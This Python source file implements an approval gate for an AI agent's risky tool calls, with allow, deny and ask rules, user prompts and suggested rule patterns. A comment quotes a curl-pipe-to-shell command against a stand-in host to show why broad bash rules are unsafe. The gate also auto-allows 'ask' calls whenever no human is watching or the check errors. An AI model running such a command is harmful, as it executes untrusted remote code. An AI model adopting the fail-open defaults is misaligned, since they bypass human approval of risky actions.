"""Process-wide tool-call permission broker (opencode-style approval gate).

Every ``HostDispatcher.__call__`` for a risk-bearing tool consults the singleton
``broker()`` via :meth:`PermissionBroker.gate`. The gate resolves the call
against the persisted rules (see :meth:`Store.resolve_permission`) and:

* ``allow`` → returns immediately;
* ``deny``  → returns a soft-fail the model can recover from;
* ``ask``   → if a UI channel is registered for the conversation, emits an
  ``await_permission`` event and BLOCKS the (daemon) turn thread until the user
  answers via ``POST /api/frames/<id>/decision`` (→ :meth:`resolve`), a turn
  cancel (→ :meth:`cancel_root`) or a timeout; with no channel (headless/CLI),
  ``ask`` degrades to allow so non-interactive runs are never wedged.

The broker is keyed by ``root_frame_id`` so the SAME dispatcher (foreground +
background cells) and any nested/delegated dispatcher all gate uniformly and
their prompts surface in the one conversation the user is watching — without the
delegation subsystem needing to know anything about the gate.
"""
from __future__ import annotations

import re
import threading
import time
import uuid
from typing import Any, Callable

_SCOPES = ("once", "conversation", "project", "global")


def suggest_patterns(method: str, target: str) -> list[str]:
    """Offer a few generalizations of a tool target for the 'remember' picker,
    most-specific first (opencode's biggest UX win over storing exact strings)."""
    target = (target or "").strip()
    out: list[str] = []
    if target:
        out.append(target)
    if method == "bash" and target:
        # A '*' in a bash rule spans shell metacharacters, so a broad prefix rule
        # like 'git *' would also authorize 'git x && curl evil|sh'. Only offer
        # prefix generalizations for a SINGLE simple command (no ; && || | ` $()
        # redirects); for a compound command offer just the exact string.
        if not re.search(r"[;&|`]|\$\(|>|<", target):
            toks = target.split()
            if len(toks) >= 2:
                out.append(f"{toks[0]} {toks[1]} *")
            if toks:
                out.append(f"{toks[0]} *")
    elif method in ("write_file", "edit_file", "read_file", "save_artifact") and target:
        # dir/* and *.ext generalizations
        if "/" in target:
            out.append(target.rsplit("/", 1)[0] + "/*")
        if "." in target.rsplit("/", 1)[-1]:
            out.append("*." + target.rsplit(".", 1)[-1])
    elif method == "web_fetch" and target:
        out.append(target)  # already a domain
    elif method == "mcp_call" and "/" in target:
        out.append(target.split("/", 1)[0] + "/*")
    out.append("*")
    # de-dupe preserving order
    seen: set[str] = set()
    uniq: list[str] = []
    for p in out:
        if p and p not in seen:
            seen.add(p)
            uniq.append(p)
    return uniq


class _Pending:
    __slots__ = (
        "event",
        "allow",
        "scope",
        "pattern",
        "message",
        "payload",
        "created_at",
    )

    def __init__(self, payload: dict):
        self.event = threading.Event()
        self.allow = False
        self.scope = "once"
        self.pattern: str | None = None
        self.message: str | None = None
        self.payload = payload
        self.created_at = time.time()


class PermissionBroker:
    DEFAULT_TIMEOUT = (
        900.0  # 15 min — backstop so a never-answered prompt frees the turn
    )
    _POLL = 0.5

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._channels: dict[str, dict] = {}  # root_frame_id -> {emit, cancel}
        self._pending: dict[str, _Pending] = {}  # decision_id -> _Pending
        self._by_root: dict[str, set[str]] = {}  # root_frame_id -> {decision_id}

    # --- UI channel registration (called by the web gateway) --------------
    def register_channel(
        self,
        root_frame_id: str,
        emit: Callable[[dict], Any],
        cancel_event: threading.Event | None = None,
        watching: Callable[[], bool] | None = None,
    ) -> None:
        # `watching` (optional) reports whether a human is ACTUALLY viewing this
        # conversation right now (a live WS subscriber). The gate only prompts —
        # and blocks — when someone can answer; otherwise it degrades to allow so
        # an unwatched/background/headless turn is never wedged for 15 minutes.
        with self._lock:
            self._channels[root_frame_id] = {
                "emit": emit,
                "cancel": cancel_event,
                "watching": watching,
            }

    def unregister_channel(self, root_frame_id: str) -> None:
        with self._lock:
            self._channels.pop(root_frame_id, None)

    def pending_events(self, root_frame_id: str) -> list[dict]:
        """Outstanding await_permission payloads for a conversation (for a
        client reconnecting mid-pause)."""
        with self._lock:
            return [
                self._pending[d].payload
                for d in self._by_root.get(root_frame_id, ())
                if d in self._pending
            ]

    def is_pending(self, root_frame_id: str) -> bool:
        """Whether a tool call is currently blocked awaiting approval for this
        conversation. The cell watchdog uses this to freeze its clock so a slow
        human approval is not mistaken for a wedged cell."""
        with self._lock:
            return bool(self._by_root.get(root_frame_id))

    # --- the gate (called by HostDispatcher, on the turn thread) ----------
    def gate(
        self,
        *,
        store,
        frame_id: str | None,
        method: str,
        target: str = "",
        view: tuple | None = None,
        project_id: str | None = None,
        timeout: float | None = None,
    ) -> dict:
        # Resolve the conversation identity + project from the dispatcher's frame
        # (works for root, background and delegated child dispatchers alike).
        root = frame_id
        proj = project_id
        try:
            if frame_id:
                fr = store.get_frame(frame_id)
                if fr:
                    root = fr.get("root_frame_id") or frame_id
                    proj = proj or fr.get("project_id") or "default"
                # A delegated sub-agent's child frame carries project_id='default';
                # resolve the project from the ROOT conversation frame so project-
                # scoped rules (and the ROOT's UI channel) apply to sub-agents too.
                if root and root != frame_id:
                    rfr = store.get_frame(root)
                    if rfr and rfr.get("project_id"):
                        proj = rfr.get("project_id")
        except Exception:  # noqa: BLE001 — never let resolution break a tool call
            pass
        try:
            decision = store.resolve_permission(
                root_frame_id=root,
                project_id=proj or "default",
                tool=method,
                pattern_input=target,
            )
        except Exception:  # noqa: BLE001
            decision = "ask"
        if decision == "allow":
            return {"allow": True}
        if decision == "deny":
            return {
                "allow": False,
                "message": "blocked by a standing 'deny' permission rule",
            }

        # decision == "ask"
        with self._lock:
            chan = self._channels.get(root)
        if chan is None:
            # No UI attached (headless/CLI/tests) — cannot prompt; allow.
            return {"allow": True}
        # A channel is registered, but only prompt if a human is ACTUALLY
        # watching this conversation right now. Otherwise the await_permission
        # event would stream to nobody and the turn would block for the full
        # timeout then get denied — the "runs but never returns" hang. Degrade
        # to allow so unwatched/background turns proceed.
        watching = chan.get("watching")
        if watching is not None:
            try:
                if not watching():
                    return {"allow": True}
            except Exception:  # noqa: BLE001 — never let the check break a call
                return {"allow": True}
        cancel_ev = chan.get("cancel")
        if cancel_ev is not None and cancel_ev.is_set():
            return {"allow": False, "message": "turn cancelled"}

        did = "perm-" + uuid.uuid4().hex[:12]
        kind = view[0] if view else method
        title = view[1] if view else method
        inp = view[2] if (view and len(view) > 2) else {}
        payload = {
            "type": "await_permission",
            "frame_id": root,
            "decision_id": did,
            "tool": method,
            "kind": kind,
            "title": title,
            "input": inp,
            "target": target,
            "suggested_patterns": suggest_patterns(method, target),
            "scopes": list(_SCOPES),
            "sub_agent": bool(frame_id and root and frame_id != root),
        }
        pend = _Pending(payload)
        with self._lock:
            self._pending[did] = pend
            self._by_root.setdefault(root, set()).add(did)
        try:
            chan["emit"](payload)
        except Exception:  # noqa: BLE001
            pass

        deadline = time.time() + (timeout or self.DEFAULT_TIMEOUT)
        try:
            while not pend.event.wait(self._POLL):
                if cancel_ev is not None and cancel_ev.is_set():
                    pend.allow, pend.message = False, "turn cancelled"
                    break
                if time.time() >= deadline:
                    pend.allow, pend.message = False, "approval timed out"
                    break
        finally:
            with self._lock:
                self._pending.pop(did, None)
                s = self._by_root.get(root)
                if s:
                    s.discard(did)
                    if not s:
                        self._by_root.pop(root, None)
            try:
                chan["emit"](
                    {
                        "type": "permission_resolved",
                        "frame_id": root,
                        "decision_id": did,
                        "allow": pend.allow,
                        "scope": pend.scope,
                    }
                )
            except Exception:  # noqa: BLE001
                pass

        # Persist the chosen rule (on the turn thread, with the caller's store).
        if pend.scope and pend.scope != "once":
            scope_id = {
                "conversation": root,
                "project": proj or "default",
                "global": "",
            }.get(pend.scope, "")
            try:
                store.set_permission_rule(
                    scope=pend.scope,
                    scope_id=scope_id,
                    tool=method,
                    pattern=(pend.pattern or target or "*"),
                    decision=("allow" if pend.allow else "deny"),
                )
            except Exception:  # noqa: BLE001
                pass
        if pend.allow:
            return {"allow": True}
        return {"allow": False, "message": pend.message or "denied by user"}

    # --- decision + cancel (called by the web gateway / HTTP thread) ------
    def resolve(
        self,
        decision_id: str | None,
        *,
        allow: bool,
        scope: str = "once",
        pattern: str | None = None,
        message: str | None = None,
    ) -> bool:
        if not decision_id:
            return False
        with self._lock:
            pend = self._pending.get(decision_id)
            if pend is None:
                return False
            pend.allow = bool(allow)
            pend.scope = scope if scope in _SCOPES else "once"
            pend.pattern = pattern
            pend.message = message
            pend.event.set()
        return True

    def cancel_root(self, root_frame_id: str) -> None:
        """Deny every pending prompt for a conversation (on turn cancel)."""
        with self._lock:
            dids = list(self._by_root.get(root_frame_id, ()))
            for did in dids:
                pend = self._pending.get(did)
                if pend is not None:
                    pend.allow = False
                    pend.message = "turn cancelled"
                    pend.event.set()


_BROKER: PermissionBroker | None = None
_BROKER_LOCK = threading.Lock()


def broker() -> PermissionBroker:
    global _BROKER
    if _BROKER is None:
        with _BROKER_LOCK:
            if _BROKER is None:
                _BROKER = PermissionBroker()
    return _BROKER
